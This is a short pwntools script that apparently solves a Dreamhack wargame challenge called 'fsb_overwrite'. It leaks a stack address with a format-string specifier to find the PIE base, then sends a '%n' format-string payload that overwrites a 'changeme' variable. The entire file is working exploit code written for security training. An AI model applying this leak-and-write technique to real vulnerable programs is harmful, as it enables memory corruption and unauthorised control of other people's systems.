from pwn import *

#p = process('./fsb_overwrite')
p = remote('host3.dreamhack.games', '11341')
e = ELF('./fsb_overwrite')

__libc_csu_init_offset = 0x940
_start_offset = 0x730
changeme_offset = 0x000000000020101c

#p.sendline('%7$p')
p.sendline(b'%9$p')
#__libc_csu_init_addr = int(p.recvline()[:-1], 16)
#pie_base = __libc_csu_init_addr - __libc_csu_init_offset
_start_addr = int(p.recvline()[:-1], 16)
pie_base = _start_addr - _start_offset
#print(hex(pie_base))
changeme_addr = pie_base + changeme_offset
'''
payload = p64(changeme_addr)
payload += "%1329c%6$n"
payload = payload.ljust(0x20, '\x00')
'''
payload = b"%1337c%9$n"
payload = payload.ljust(0x18, b" ")
payload += p64(changeme_addr)

p.sendline(payload)
'''
payload = p64(changeme_addr)
print("changeme : " + p.recvline())
'''
p.interactive()